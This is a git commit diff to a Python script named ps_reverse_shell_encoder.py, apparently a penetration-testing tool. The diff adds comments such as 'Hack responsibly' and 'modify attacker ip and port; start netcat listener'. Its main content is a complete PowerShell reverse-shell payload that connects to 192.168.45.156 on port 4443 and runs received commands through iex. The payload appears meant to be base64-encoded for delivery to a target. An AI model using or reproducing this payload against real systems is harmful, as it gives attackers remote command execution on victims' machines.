b8cb12b1a50ac4ba307bf10739e51c48e67f1e71
oregoncyber <98023499+oregoncyber@users.noreply.github.com>
2024-04-27 12:58:29 -0700

    Update ps_reverse_shell_encoder.py
    added wrapping to look cleaner
    comments for clarity

--- ps_reverse_shell_encoder.py
+++ ps_reverse_shell_encoder.py
@@ -1,9 +1,11 @@
 #!/usr/bin/python3
+#Creates a powershell reverse shell and encodes it
+#Hack responsibly
 
 import sys
 import base64
 
-#Modify IP and port; start netcat listener
+#modify attacker ip and port; start netcat listener. 
 
 payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.156",4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'                                     
 
